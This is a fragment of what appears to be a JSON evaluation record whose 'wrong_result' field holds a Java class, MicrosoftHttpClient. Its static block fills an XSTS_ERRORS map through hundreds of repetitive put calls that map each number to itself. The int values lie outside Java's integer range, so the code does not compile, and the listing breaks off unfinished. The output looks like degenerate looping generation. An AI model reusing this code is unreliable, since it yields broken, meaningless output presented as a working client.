    "wrong_result": "public class MicrosoftHttpClient {\n    public static final java.util.Map<Long, Integer> XSTS_ERRORS = new java.util.HashMap<>();\n\n    static {\n        XSTS_ERRORS.put(2148917763L, 2148917763);\n        XSTS_ERRORS.put(2148917764L, 2148917764);\n        XSTS_ERRORS.put(2148917765L, 2148917765);\n        XSTS_ERRORS.put(2148917766L, 2148917766);\n        XSTS_ERRORS.put(2148917767L, 2148917767);\n        XSTS_ERRORS.put(2148917768L, 2148917768);\n        XSTS_ERRORS.put(2148917769L, 2148917769);\n        XSTS_ERRORS.put(2148917770L, 2148917770);\n        XSTS_ERRORS.put(2148917771L, 2148917771);\n        XSTS_ERRORS.put(2148917772L, 2148917772);\n        XSTS_ERRORS.put(2148917773L, 2148917773);\n        XSTS_ERRORS.put(2148917774L, 2148917774);\n        XSTS_ERRORS.put(2148917775L, 2148917775);\n        XSTS_ERRORS.put(2148917776L, 2148917776);\n        XSTS_ERRORS.put(2148917777L, 2148917777);\n        XSTS_ERRORS.put(2148917778L, 2148917778);\n        XSTS_ERRORS.put(2148917779L, 2148917779);\n        XSTS_ERRORS.put(2148917780L, 2148917780);\n        XSTS_ERRORS.put(2148917781L, 2148917781);\n        XSTS_ERRORS.put(2148917782L, 2148917782);\n        XSTS_ERRORS.put(2148917783L, 2148917783);\n        XSTS_ERRORS.put(2148917784L, 2148917784);\n        XSTS_ERRORS.put(2148917785L, 2148917785);\n        XSTS_ERRORS.put(2148917786L, 2148917786);\n        XSTS_ERRORS.put(2148917787L, 2148917787);\n        XSTS_ERRORS.put(2148917788L, 2148917788);\n        XSTS_ERRORS.put(2148917789L, 2148917789);\n        XSTS_ERRORS.put(2148917790L, 2148917790);\n        XSTS_ERRORS.put(2148917791L, 2148917791);\n        XSTS_ERRORS.put(2148917792L, 2148917792);\n        XSTS_ERRORS.put(2148917793L, 2148917793);\n        XSTS_ERRORS.put(2148917794L, 2148917794);\n        XSTS_ERRORS.put(2148917795L, 2148917795);\n        XSTS_ERRORS.put(2148917796L, 2148917796);\n        XSTS_ERRORS.put(2148917797L, 2148917797);\n        XSTS_ERRORS.put(2148917798L, 2148917798);\n        XSTS_ERRORS.put(2148917799L, 2148917799);\n        XSTS_ERRORS.put(2148917800L, 2148917800);\n        XSTS_ERRORS.put(2148917801L, 2148917801);\n        XSTS_ERRORS.put(2148917802L, 2148917802);\n        XSTS_ERRORS.put(2148917803L, 2148917803);\n        XSTS_ERRORS.put(2148917804L, 2148917804);\n        XSTS_ERRORS.put(2148917805L, 2148917805);\n        XSTS_ERRORS.put(2148917806L, 2148917806);\n        XSTS_ERRORS.put(2148917807L, 2148917807);\n        XSTS_ERRORS.put(2148917808L, 2148917808);\n        XSTS_ERRORS.put(2148917809L, 2148917809);\n        XSTS_ERRORS.put(2148917810L, 2148917810);\n        XSTS_ERRORS.put(2148917811L, 2148917811);\n        XSTS_ERRORS.put(2148917812L, 2148917812);\n        XSTS_ERRORS.put(2148917813L, 2148917813);\n        XSTS_ERRORS.put(2148917814L, 2148917814);\n        XSTS_ERRORS.put(2148917815L, 2148917815);\n        XSTS_ERRORS.put(2148917816L, 2148917816);\n        XSTS_ERRORS.put(2148917817L, 2148917817);\n        XSTS_ERRORS.put(2148917818L, 2148917818);\n        XSTS_ERRORS.put(2148917819L, 2148917819);\n        XSTS_ERRORS.put(2148917820L, 2148917820);\n        XSTS_ERRORS.put(2148917821L, 2148917821);\n        XSTS_ERRORS.put(2148917822L, 2148917822);\n        XSTS_ERRORS.put(2148917823L, 2148917823);\n        XSTS_ERRORS.put(2148917824L, 2148917824);\n        XSTS_ERRORS.put(2148917825L, 2148917825);\n        XSTS_ERRORS.put(2148917826L, 2148917826);\n        XSTS_ERRORS.put(2148917827L, 2148917827);\n        XSTS_ERRORS.put(2148917828L, 2148917828);\n        XSTS_ERRORS.put(2148917829L, 2148917829);\n        XSTS_ERRORS.put(2148917830L, 2148917830);\n        XSTS_ERRORS.put(2148917831L, 2148917831);\n        XSTS_ERRORS.put(2148917832L, 2148917832);\n        XSTS_ERRORS.put(2148917833L, 2148917833);\n        XSTS_ERRORS.put(2148917834L, 2148917834);\n        XSTS_ERRORS.put(2148917835L, 2148917835);\n        XSTS_ERRORS.put(2148917836L, 2148917836);\n        XSTS_ERRORS.put(2148917837L, 2148917837);\n        XSTS_ERRORS.put(2148917838L, 2148917838);\n        XSTS_ERRORS.put(2148917839L, 2148917839);\n        XSTS_ERRORS.put(2148917840L, 2148917840);\n        XSTS_ERRORS.put(2148917841L, 2148917841);\n        XSTS_ERRORS.put(2148917842L, 2148917842);\n        XSTS_ERRORS.put(2148917843L, 2148917843);\n        XSTS_ERRORS.put(2148917844L, 2148917844);\n        XSTS_ERRORS.put(2148917845L, 2148917845);\n        XSTS_ERRORS.put(2148917846L, 2148917846);\n        XSTS_ERRORS.put(2148917847L, 2148917847);\n        XSTS_ERRORS.put(2148917848L, 2148917848);\n        XSTS_ERRORS.put(2148917849L, 2148917849);\n        XSTS_ERRORS.put(2148917850L, 2148917850);\n        XSTS_ERRORS.put(2148917851L, 2148917851);\n        XSTS_ERRORS.put(2148917852L, 2148917852);\n        XSTS_ERRORS.put(2148917853L, 2148917853);\n        XSTS_ERRORS.put(2148917854L, 2148917854);\n        XSTS_ERRORS.put(2148917855L, 2148917855);\n        XSTS_ERRORS.put(2148917856L, 2148917856);\n        XSTS_ERRORS.put(2148917857L, 2148917857);\n        XSTS_ERRORS.put(2148917858L, 2148917858);\n        XSTS_ERRORS.put(2148917859L, 2148917859);\n        XSTS_ERRORS.put(2148917860L, 2148917860);\n        XSTS_ERRORS.put(2148917861L, 2148917861);\n        XSTS_ERRORS.put(2148917862L, 2148917862);\n        XSTS_ERRORS.put(2148917863L, 2148917863);\n        XSTS_ERRORS.put(2148917864L, 2148917864);\n        XSTS_ERRORS.put(2148917865L, 2148917865);\n        XSTS_ERRORS.put(2148917866L, 2148917866);\n        XSTS_ERRORS.put(2148917867L, 2148917867);\n        XSTS_ERRORS.put(2148917868L, 2148917868);\n        XSTS_ERRORS.put(2148917869L, 2148917869);\n        XSTS_ERRORS.put(2148917870L, 2148917870);\n        XSTS_ERRORS.put(2148917871L, 2148917871);\n        XSTS_ERRORS.put(2148917872L, 2148917872);\n        XSTS_ERRORS.put(2148917873L, 2148917873);\n        XSTS_ERRORS.put(2148917874L, 2148917874);\n        XSTS_ERRORS.put(2148917875L, 2148917875);\n        XSTS_ERRORS.put(2148917876L, 2148917876);\n        XSTS_ERRORS.put(2148917877L, 2148917877);\n        XSTS_ERRORS.put(2148917878L, 2148917878);\n        XSTS_ERRORS.put(2148917879L, 2148917879);\n        XSTS_ERRORS.put(2148917880L, 2148917880);\n        XSTS_ERRORS.put(2148917881L, 2148917881);\n        XSTS_ERRORS.put(2148917882L, 2148917882);\n        XSTS_ERRORS.put(2148917883L, 2148917883);\n        XSTS_ERRORS.put(2148917884L, 2148917884);\n        XSTS_ERRORS.put(2148917885L, 2148917885);\n        XSTS_ERRORS.put(2148917886L, 2148917886);\n        XSTS_ERRORS.put(2148917887L, 2148917887);\n        XSTS_ERRORS.put(2148917888L, 2148917888);\n        XSTS_ERRORS.put(2148917889L, 2148917889);\n        XSTS_ERRORS.put(2148917890L, 2148917890);\n        XSTS_ERRORS.put(2148917891L, 2148917891);\n        XSTS_ERRORS.put(2148917892L, 2148917892);\n        XSTS_ERRORS.put(2148917893L, 2148917893);\n        XSTS_ERRORS.put(2148917894L, 2148917894);\n        XSTS_ERRORS.put(2148917895L, 2148917895);\n        XSTS_ERRORS.put(2148917896L, 2148917896);\n        XSTS_ERRORS.put(2148917897L, 2148917897);\n        XSTS_ERRORS.put(2148917898L, 2148917898);\n        XSTS_ERRORS.put(2148917899L, 2148917899);\n        XSTS_ERRORS.put(2148917900L, 2148917900);\n        XSTS_ERRORS.put(2148917901L, 2148917901);\n        XSTS_ERRORS.put(2148917902L, 2148917902);\n        XSTS_ERRORS.put(2148917903L, 2148917903);\n        XSTS_ERRORS.put(2148917904L, 2148917904);\n        XSTS_ERRORS.put(2148917905L, 2148917905);\n        XSTS_ERRORS.put(2148917906L, 2148917906);\n        XSTS_ERRORS.put(2148917907L, 2148917907);\n        XSTS_ERRORS.put(2148917908L, 2148917908);\n        XSTS_ERRORS.put(2148917909L, 2148917909);\n        XSTS_ERRORS.put(2148917910L, 2148917910);\n        XSTS_ERRORS.put(2148917911L, 2148917911);\n        XSTS_ERRORS.put(2148917912L, 2148917912);\n        XSTS_ERRORS.put(2148917913L, 2148917913);\n        XSTS_ERRORS.put(2148917914L, 2148917914);\n        XSTS_ERRORS.put(2148917915L, 2148917915);\n        XSTS_ERRORS.put(2148917916L, 2148917916);\n        XSTS_ERRORS.put(2148917917L, 2148917917);\n        XSTS_ERRORS.put(2148917918L, 2148917918);\n        XSTS_ERRORS.put(2148917919L, 2148917919);\n        XSTS_ERRORS.put(2148917920L, 2148917920);\n        XSTS_ERRORS.put(2148917921L, 2148917921);\n        XSTS_ERRORS.put(2148917922L, 2148917922);\n        XSTS_ERRORS.put(2148917923L, 2148917923);\n        XSTS_ERRORS.put(2148917924L, 2148917924);\n        XSTS_ERRORS.put(2148917925L, 2148917925);\n        XSTS_ERRORS.put(2148917926L, 2148917926);\n        XSTS_ERRORS.put(2148917927L, 2148917927);\n        XSTS_ERRORS.put(2148917928L, 2148917928);\n        XSTS_ERRORS.put(2148917929L, 2148917929);\n        XSTS_ERRORS.put(2148917930L, 2148917930);\n        XSTS_ERRORS.put(2148917931L, 2148917931);\n        XSTS_ERRORS.put(2148917932L, 2148917932);\n        XSTS_ERRORS.put(2148917933L, 2148917933);\n        XSTS_ERRORS.put(2148917934L, 2148917934);\n        XSTS_ERRORS.put(2148917935L, 2148917935);\n        XSTS_ERRORS.put(2148917936L, 2148917936);\n        XSTS_ERRORS.put(2148917937L, 2148917937);\n        XSTS_ERRORS.put(2148917938L, 2148917938);\n        XSTS_ERRORS.put(2148917939L, 2148917939);\n        XSTS_ERRORS.put(2148917940L, 2148917940);\n        XSTS_ERRORS.put(2148917941L, 2148917941);\n        XSTS_ERRORS.put(2148917942L, 2148917942);\n        XSTS_ERRORS.put(2148917943L, 2148917943);\n        XSTS_ERRORS.put(2148917944L, 2148917944);\n        XSTS_ERRORS.put(2148917945L, 2148917945);\n        XSTS_ERRORS.put(2148917946L, 2148917946);\n        XSTS_ERRORS.put(2148917947L, 2148917947);\n        XSTS_ERRORS.put(2148917948L, 2148917948);\n        XSTS_ERRORS.put(2148917949L, 2148917949);\n        XSTS_ERRORS.put(2148917950L, 2148917950);\n        XSTS_ERRORS.put(2148917951L, 2148917951);\n        XSTS_ERRORS.put(2148917952L, 2148917952);\n        XSTS_ERRORS.put(2148917953L, 2148917953);\n        XSTS_ERRORS.put(2148917954L, 2148917954);\n        XSTS_ERRORS.put(2148917955L, 2148917955);\n        XSTS_ERRORS.put(2148917956L, 2148917956);\n        XSTS_ERRORS.put(2148917957L, 2148917957);\n        XSTS_ERRORS.put(2148917958L, 2148917958);\n        XSTS_ERRORS.put(2148917959L, 2148917959);\n        XSTS_ERRORS.put(2148917960L, 2148917960);\n        XSTS_ERRORS.put(2148917961L, 2148917961);\n        XSTS_ERRORS.put(2148917962L, 2148917962);\n        XSTS_ERRORS.put(2148917963L, 2148917963);\n        XSTS_ERRORS.put(2148917964L, 2148917964);\n        XSTS_ERRORS.put(2148917965L, 2148917965);\n        XSTS_ERRORS.put(2148917966L, 2148917966);\n        XSTS_ERRORS.put(2148917967L, 2148917967);\n        XSTS_ERRORS.put(2148917968L, 2148917968);\n        XSTS_ERRORS.put(2148917969L, 2148917969);\n        XSTS_ERRORS.put(2148917970L, 2148917970);\n        XSTS_ERRORS.put(2148917971L, 2148917971);\n        XSTS_ERRORS.put(2148917972L, 2148917972);\n        XSTS_ERRORS.put(2148917973L, 2148917973);\n        XSTS_ERRORS.put(2148917974L, 2148917974);\n        XSTS_ERRORS.put(2148917975L, 2148917975);\n        XSTS_ERRORS.put(2148917976L, 2148917976);\n        XSTS_ERRORS.put(2148917977L, 2148917977);\n        XSTS_ERRORS.put(2148917978L, 2148917978);\n        XSTS_ERRORS.put(2148917979L, 2148917979);\n        XSTS_ERRORS.put(2148917980L, 2148917980);\n        XSTS_ERRORS.put(2148917981L, 2148917981);\n        XSTS_ERRORS.put(2148917982L, 2148917982);\n        XSTS_ERRORS.put(2148917983L, 2148917983);\n        XSTS_ERRORS.put(2148917984L, 2148917984);\n        XSTS_ERRORS.put(2148917985L, 2148917985);\n        XSTS_ERRORS.put(2148917986L, 2148917986);\n        XSTS_ERRORS.put(2148917987L, 2148917987);\n        XSTS_ERRORS.put(2148917988L, 2148917988);\n        XSTS_ERRORS.put(2148917989L, 2148917989);\n        XSTS_ERRORS.put(2148917990L, 2148917990);\n        XSTS_ERRORS.put(2148917991L, 2148917991);\n        XSTS_ERRORS.put(2148917992L, 2148917992);\n        XSTS_ERRORS.put(2148917993L, 2148917993);\n        XSTS_ERRORS.put(2148917994L, 2148917994);\n        XSTS_ERRORS.put(2148917995L, 2148917995);\n        XSTS_ERRORS.put(2148917996L, 2148917996);\n        XSTS_ERRORS.put(2148917997L, 2148917997);\n        XSTS_ERRORS.put(2148917998L, 2148917998);\n        XSTS_ERRORS.put(2148917999L, 2148917999);\n        XSTS_ERRORS.put(2148918000L, 2148918000);\n        XSTS_ERRORS.put(2148918001L, 2148918001);\n        XSTS_ERRORS.put(2148918002L, 2148918002);\n        XSTS_ERRORS.put(2148918003L, 2148918003);\n        XSTS_ERRORS.put(2148918004L, 2148918004);\n        XSTS_ERRORS.put(2148918005L, 2148918005);\n        XSTS_ERRORS.put(2148918006L, 2148918006);\n        XSTS_ERRORS.put(2148918007L, 2148918007);\n        XSTS_ERRORS.put(2148918008L, 2148918008);\n        XSTS_ERRORS.put(2148918009L, 2148918009);\n        XSTS_ERRORS.put(2148918010L, 2148918010);\n        XSTS_ERRORS.put(2148918011L, 2148918011);\n        XSTS_ERRORS.put(2148918012L, 2148918012);\n        XSTS_ERRORS.put(2148918013L, 2148918013);\n        XSTS_ERRORS.put(2148918014L, 2148918014);\n        XSTS_ERRORS.put(2148918015L, 2148918015);\n        XSTS_ERRORS.put(2148918016L, 2148918016);\n        XSTS_ERRORS.put(2148918017L, 2148918017);\n        XSTS_ERRORS.put(2148918018L, 2148918018);\n        XSTS_ERRORS.put(2148918019L, 2148918019);\n        XSTS_ERRORS.put(2148918020L, 2148918020);\n        XSTS_ERRORS.put(2148918021L, 2148918021);\n        XSTS_ERRORS.put(2148918022L, 2148918022);\n        XSTS_ERRORS.put(2148918023L, 2148918023);\n        XSTS_ERRORS.put(2148918024L, 2148918024);\n        XSTS_ERRORS.put(2148918025L, 2148918025);\n        XSTS_ERRORS.put(2148918026L, 2148918026);\n        XSTS_ERRORS.put(2148918027L, 2148918027);\n        XSTS_ERRORS.put(2148918028L, 2148918028);\n        XSTS_ERRORS.put(2148918029L, 2148918029);\n        XSTS_ERRORS.put(2148918030L, 2148918030);\n        XSTS_ERRORS.put(2148918031L, 2148918031);\n        XSTS_ERRORS.put(2148918032L, 2148918032);\n        XSTS_ERRORS.put(2148918033L, 2148918033);\n        XSTS_ERRORS.put(2148918034L, 2148918034);\n        XSTS_ERRORS.put(2148918035L, 2148918035);\n        XSTS_ERRORS.put(2148918036L, 2148918036);\n        XSTS_ERRORS.put(2148918037L, 2148918037);\n        XSTS_ERRORS.put(2148918038L, 2148918038);\n        XSTS_ERRORS.put(2148918039L, 2148918039);\n        XSTS_ERRORS.put(2148918040L, 2148918040);\n        XSTS_ERRORS.put(2148918041L, 2148918041);\n        XSTS_ERRORS.put(2148918042L, 2148918042);\n        XSTS_ERRORS.put(2148918043L, 2148918043);\n        XSTS_ERRORS.put(2148918044L, 2148918044);\n        XSTS_ERRORS.put(2148918045L, 2148918045);\n        XSTS_ERRORS.put(2148918046L, 2148918046);\n        XSTS_ERRORS.put(2148918047L, 2148918047);\n        XSTS_ERRORS.put(2148918048L, 2148918048);\n        XSTS_ERRORS.put(2148918049L, 2148918049);\n        XSTS_ERRORS.put(2148918050L, 2148918050);\n        XSTS_ERRORS.put(2148918051L, 2148918051);\n        XSTS_ERRORS.put(2148918052L, 2148918052);\n        XSTS_ERRORS.put(2148918053L, 2148918053);\n        XSTS_ERRORS.put(2148918054L, 2148918054);\n        XSTS_ERRORS.put(2148918055L, 2148918055);\n        XSTS_ERRORS.put(2148918056L, 2148918056);\n        XSTS_ERRORS.put(2148918057L, 2148918057);\n        XSTS_ERRORS.put(2148918058L, 2148918058);\n        XSTS_ERRORS.put(2148918059L, 2148918059);\n        XSTS_ERRORS.put(2148918060L, 2148918060);\n        XSTS_ERRORS.put(2148918061L, 2148918061);\n        XSTS_ERRORS.put(2148918062L, 2148918062);\n        XSTS_ERRORS.put(2148918063L, 2148918063);\n        XSTS_ERRORS.put(2148918064L, 2148918064);\n        XSTS_ERRORS.put(2148918065L, 2148918065);\n        XSTS_ERRORS.put(2148918066L, 2148918066);\n        XSTS_ERRORS.put(2148918067L, 2148918067);\n        XSTS_ERRORS.put(2148918068L, 2148918068);\n        XSTS_ERRORS.put(2148918069L, 2148918069);\n        XSTS_ERRORS.put(2148918070L, 2148918070);\n        XSTS_ERRORS.put(2148918071L, 2148918071);\n        XSTS_ERRORS.put(2148918072L, 2148918072);\n        XSTS_ERRORS.put(2148918073L, 2148918073);\n        XSTS_ERRORS.put(2148918074L, 2148918074);\n        XSTS_ERRORS.put(2148918075L, 2148918075);\n        XSTS_ERRORS.put(2148918076L, 2148918076);\n        XSTS_ERRORS.put(2148918077L, 2148918077);\n        XSTS_ERRORS.put(2148918078L, 2148918078);\n        XSTS_ERRORS.put(2148918079L, 2148918079);\n        XSTS_ERRORS.put(2148918080L, 2148918080);\n        XSTS_ERRORS.put(2148918081L, 2148918081);\n        XSTS_ERRORS.put(2148918082L, 2148918082);\n        XSTS_ERRORS.put(2148918083L, 2148918083);\n        XSTS_ERRORS.put(2148918084L, 2148918084);\n        XSTS_ERRORS.put(2148918085L, 2148918085);\n        XSTS_ERRORS.put(2148918086L, 2148918086);\n        XSTS_ERRORS.put(2148918087L, 2148918087);\n        XSTS_ERRORS.put(2148918088L, 2148918088);\n        XSTS_ERRORS.put(2148918089L, 2148918089);\n        XSTS_ERRORS.put(2148918090L, 2148918090);\n        XSTS_ERRORS.put(2148918091L, 2148918091);\n        XSTS_ERRORS.put(2148918092L, 2148918092);\n        XSTS_ERRORS.put(2148918093L, 2148918093);\n        XSTS_ERRORS.put(2148918094L, 2148918094);\n        XSTS_ERRORS.put(2148918095L, 2148918095);\n        XSTS_ERRORS.put(2148918096L, 2148918096);\n        XSTS_ERRORS.put(2148918097L, 2148918097);\n        XSTS_ERRORS.put(2148918098L, 2148918098);\n        XSTS_ERRORS.put(2148918099L, 2148918099);\n        XSTS_ERRORS.put(2148918100L, 2148918100);\n        XSTS_ERRORS.put(2148918101L, 2148918101);\n        XSTS_ERRORS.put(2148918102L, 2148918102);\n        XSTS_ERRORS.put(2148918103L, 2148918103);\n        XSTS_ERRORS.put(2148918104L, 2148918104);\n        XSTS_ERRORS.put(2148918105L, 2148918105);\n        XSTS_ERRORS.put(2148918106L, 2148918106);\n        XSTS_ERRORS.put(2148918107L, 2148918107);\n        XSTS_ERRORS.put(2148918108L, 2148918108);\n        XSTS_ERRORS.put(2148918109L, 2148918109);\n        XSTS_ERRORS.put(2148918110L, 2148918110);\n        XSTS_ERRORS.put(2148918111L, 2148918111);\n        XSTS_ERRORS.put(2148918112L, 2148918112);\n        XSTS_ERRORS.put(2148918113L, 2148918113);\n        XSTS_ERRORS.put(2148918114L, 2148918114);\n        XSTS_ERRORS.put(2148918115L, 2148918115);\n        XSTS_ERRORS.put(2148918116L, 2148918116);\n        XSTS_ERRORS.put(2148918117L, 2148918117);\n        XSTS_ERRORS.put(2148918118L, 2148918118);\n        XSTS_ERRORS.put(2148918119L, 2148918119);\n        XSTS_ERRORS.put(2148918120L, 2148918120);\n        XSTS_ERRORS.put(2148918121L, 2148918121);\n        XSTS_ERRORS.put(2148918122L, 2148918122);\n        XSTS_ERRORS.put(2148918123L, 2148918123);\n        XSTS_ERRORS.put(2148918124L, 2148918124);\n        XSTS_ERRORS.put(2148918125L, 2148918125);\n        XSTS_ERRORS.put(2148918126L, 2148918126);\n        XSTS_ERRORS.put(2148918127L, 2148918127);\n        XSTS_ERRORS.put(2148918128L, 2148918128);\n        XSTS_ERRORS.put(2148918129L, 2148918129);\n        XSTS_ERRORS.put(2148918130L, 2148918130);\n        XSTS_ERRORS.put(2148918131L, 2148918131);\n        XSTS_ERRORS.put(2148918132L, 2148918132);\n        XSTS_ERRORS.put(2148918133L, 2148918133);\n        XSTS_ERRORS.put(2148918134L, 2148918134);\n        XSTS_ERRORS.put(2148918135L, 2148918135);\n        XSTS_ERRORS.put(2148918136L, 2148918136);\n        XSTS_ERRORS.put(2148918137L, 2148918137);\n        XSTS_ERRORS.put(2148918138L, 2148918138);\n        XSTS_ERRORS.put(2148918139L, 2148918139);\n        XSTS_ERRORS.put(2148918140L, 2148918140);\n        XSTS_ERRORS.put(2148918141L, 2148918141);\n        XSTS_ERRORS.put(2148918142L, 2148918142);\n        XSTS_ERRORS.put(2148918143L, 2148918143);\n        XSTS_ERRORS.put(2148918144L, 2148918144);\n        XSTS_ERRORS.put(2148918145L, 2148918145);\n        XSTS_ERRORS.put(2148918146L, 2148918146);\n        XSTS_ERRORS.put(2148918147L, 2148918147);\n        XSTS_ERRORS.put(2148918148L, 2148918148);\n        XSTS_ERRORS.put(2148918149L, 2148918149);\n        XSTS_ERRORS.put(2148918150L, 2148918150);\n        XSTS_ERRORS.put(2148918151L, 2148918151);\n        XSTS_ERRORS.put(2148918152L, 2148918152);\n        XSTS_ERRORS.put(2148918153L, 2148918153);\n        XSTS_ERRORS.put(2148918154L, 2148918154);\n        XSTS_ERRORS.put(2148918155L, 2148918155);\n        XSTS_ERRORS.put(2148918156L, 2148918156);\n        XSTS_ERRORS.put(2148918157L, 2148918157);\n        XSTS_ERRORS.put(2148918158L, 2148918158);\n        XSTS_ERRORS.put(2148918159L, 2148918159);\n        XSTS_ERRORS.put(2148918160L, 2148918160);\n        XSTS_ERRORS.put(2148918161L, 2148918161);\n        XSTS_ERRORS.put(2148918162L, 2148918162);\n        XSTS_ERRORS.put(2148918163L, 2148918163);\n        XSTS_ERRORS.put(2148918164L, 2148918164);\n        XSTS_ERRORS.put(2148918165L, 2148918165);\n        XSTS_ERRORS.put(2148918166L, 2148918166);\n        XSTS_ERRORS.put(2148918167L, 2148918167);\n        XSTS_ERRORS.put(2148918168L, 2148918168);\n        XSTS_ERRORS.put(2148918169L, 2148918169);\n        XSTS_ERRORS.put(2148918170L, 2148918170);\n        XSTS_ERRORS.put(2148918171L, 2148918171);\n        XSTS_ERRORS.put(2148918172L, 2148918172);\n        XSTS_ERRORS.put(2148918173L, 2148918173);\n        XSTS_ERRORS.put(2148918174L, 2148918174);\n        XSTS_ERRORS.put(2148918175L, 2148918175);\n        XSTS_ERRORS.put(2148918176L, 2148918176);\n        XSTS_ERRORS.put(2148918177L, 2148918177);\n        XSTS_ERRORS.put(2148918178L, 2148918178);\n        XSTS_ERRORS.put(2148918179L, 2148918179);\n        XSTS_ERRORS.put(2148918180L, 2148918180);\n        XSTS_ERRORS.put(2148918181L, 2148918181);\n        XSTS_ERRORS.put(2148918182L, 2148918182);\n        XSTS_ERRORS.put(2148918183L, 2148918183);\n        XSTS_ERRORS.put(2148918184L, 2148918184);\n        XSTS_ERRORS.put(2148918185L, 2148918185);\n        XSTS_ERRORS.put(2148918186L, 2148918186);\n        XSTS_ERRORS.put(2148918187L, 2148918187);\n        XSTS_ERRORS.put(2148918188L, 2148918188);\n        XSTS_ERRORS.put(2148918189L, 2148918189);\n        XSTS_ERRORS.put(2148918190L, 2148918190);\n        XSTS_ERRORS.put(2148918191L, 2148918191);\n        XSTS_ERRORS.put(2148918192L, 2148918192);\n        XSTS_ERRORS.put(2148918193L, 2148918193);\n        XSTS_ERRORS.put(2148918194L, 2148918194);\n        XSTS_ERRORS.put(2148918195L, 2148918195);\n        XSTS_ERRORS.put(2148918196L, 2148918196);\n        XSTS_ERRORS.put(2148918197L, 2148918197);\n        XSTS_ERRORS.put(2148918198L, 2148918198);\n        XSTS_ERRORS.put(2148918199L, 2148918199);\n        XSTS_ERRORS.put(2148918200L, 2148918200);\n        XSTS_ERRORS.put(2148918201L, 2148918201);\n        XSTS_ERRORS.put(2148918202L, 2148918202);\n        XSTS_ERRORS.put(2148918203L, 2148918203);\n        XSTS_ERRORS.put(2148918204L, 2148918204);\n        XSTS_ERRORS.put(2148918205L, 2148918205);\n        XSTS_ERRORS.put(2148918206L, 2148918206);\n        XSTS_ERRORS.put(2148918207L, 2148918207);\n        XSTS_ERRORS.put(2148918208L, 2148918208);\n        XSTS_ERRORS.put(2148918209L, 2148918209);\n        XSTS_ERRORS.put(2148918210L, 2148918210);\n        XSTS_ERRORS.put(2148918211L, 2148918211);\n        XSTS_ERRORS.put(2148918212L, 2148918212);\n        XSTS_ERRORS.put(2148918213L, 2148918213);\n        XSTS_ERRORS.put(2148918214L, 2148918214);\n        XSTS_ERRORS.put(2148918215L, 2148918215);\n        XSTS_ERRORS.put(2148918216L, 2148918216);\n        XSTS_ERRORS.put(2148918217L, 2148918217);\n        XSTS_ERRORS.put(2148918218L, 2148918218);\n        XSTS_ERRORS.put(2148918219L, 2148918219);\n        XSTS_ERRORS.put(2148918220L, 2148918220);\n        XSTS_ERRORS.put(2148918221L, 2148918221);\n        XSTS_ERRORS.put(2148918222L, 2148918222);\n        XSTS_ERRORS.put(2148918223L, 2148918223);\n        XSTS_ERRORS.put(2148918224L, 2148918224);\n        XSTS_ERRORS.put(2148918225L, 2148918225);\n        XSTS_ERRORS.put(2148918226L, 2148918226);\n        XSTS_ERRORS.put(2148918227L, 2148918227);\n        XSTS_ERRORS.put(2148918228L, 2148918228);\n        XSTS_ERRORS.put(2148918229L, 2148918229);\n        XSTS_ERRORS.put(2148918230L, 2148918230);\n        XSTS_ERRORS.put(2148918231L, 2148918231);\n        XSTS_ERRORS.put(2148918232L, 2148918232);\n        XSTS_ERRORS.put(2148918233L, 2148918233);\n        XSTS_ERRORS.put(2148918234L, 2148918234);\n        XSTS_ERRORS.put(2148918235L, 2148918235);\n        XSTS_ERRORS.put(2148918236L, 2148918236);\n        XSTS_ERRORS.put(2148918237L, 2148918237);\n        XSTS_ERRORS.put(2148918238L, 2148918238);\n        XSTS_ERRORS.put(2148918239L, 2148918239);\n        XSTS_ERRORS.put(2148918240L, 2148918240);\n        XSTS_ERRORS.put(2148918241L, 2148918241);\n        XSTS_ERRORS.put(2148918242L, 2148918242);\n        XSTS_ERRORS.put(2148918243L, 2148918243);\n        XSTS_ERRORS.put(2148918244L, 2148918244);\n        XSTS_ERRORS.put(2148918245L, 2148918245);\n        XSTS_ERRORS.put(2148918246L, 2148918246);\n        XSTS_ERRORS.put(2148918247L, 2148918247);\n        XSTS_ERRORS.put(2148918248L, 2148918248);\n        XSTS_ERRORS.put(2148918249L, 2148918249);\n        XSTS_ERRORS.put(2148918250L, 2148918250);\n        XSTS_ERRORS.put(2148918251L, 2148918251);\n        XSTS_ERRORS.put(2148918252L, 2148918252);\n        XSTS_ERRORS.put(2148918253L, 2148918253);\n        XSTS_ERRORS.put(2148918254L, 2148918254);\n        XSTS_ERRORS.put(2148918255L, 2148918255);\n        XSTS_ERRORS.put(2148918256L, 2148918256);\n        XSTS_ERRORS.put(2148918257L, 2148918257);\n        XSTS_ERRORS.put(2148918258L, 2148918258);\n        XSTS_ERRORS.put(2148918259L, 2148918259);\n        XSTS_ERRORS.put(2148918260L, 2148918260);\n        XSTS_ERRORS.put(2148918261L, 2148918261);\n        XSTS_ERRORS.put(2148918262L, 2148918262);\n        XSTS_ERRORS.put(2148918263L, 2148918263);\n        XSTS_ERRORS.put(2148918264L, 2148918264);\n        XSTS_ERRORS.put(2148918265L, 2148918265);\n        XSTS_ERRORS.put(2148918266L, 2148918266);\n        XSTS_ERRORS.put(2148918267L, 2148918267);\n        XSTS_ERRORS.put(2148918268L, 2148918268);\n        XSTS_ERRORS.put(2148918269L, 2148918269);\n        XSTS_ERRORS.put(2148918270L, 2148918270);\n        XSTS_ERRORS.put(2148918271L, 2148918271);\n        XSTS_ERRORS.put(2148918272L, 2148918272);\n        XSTS_ERRORS.put(2148918273L, 2148918273);\n        XSTS_ERRORS.put(2148918274L, 2148918274);\n        XSTS_ERRORS.put(2148918275L, 2148918275);\n        XSTS_ERRORS.put(2148918276L, 2148918276);\n        XSTS_ERRORS.put(2148918277L, 2148918277);\n        XSTS_ERRORS.put(2148918278L, 2148918278);\n        XSTS_ERRORS.put(2148918279L, 2148918279);\n        XSTS_ERRORS.put(2148918280L, 2148918280);\n        XSTS_ERRORS.put(2148918281L, 2148918281);\n        XSTS_ERRORS.put(2148918282L, 2148918282);\n        XSTS_ERRORS.put(2148918283L, 2148918283);\n        XSTS_ERRORS.put(2148918284L, 2148918284);\n        XSTS_ERRORS.put(2148918285L, 2148918285);\n        XSTS_ERRORS.put(2148918286L, 2148918286);\n        XSTS_ERRORS.put(2148918287L, 2148918287);\n        XSTS_ERRORS.put(2148918288L, 2148918288);\n        XSTS_ERRORS.put(2148918289L, 2148918289);\n        XSTS_ERRORS.put(2148918290L, 2148918290);\n        XSTS_ERRORS.put(2148918291L, 2148918291);\n        XSTS_ERRORS.put(2148918292L, 2148918292);\n        XSTS_ERRORS.put(2148918293L, 2148918293);\n        XSTS_ERRORS.put(2148918294L, 2148918294);\n        XSTS_ERRORS.put(2148918295L, 2148918295);\n    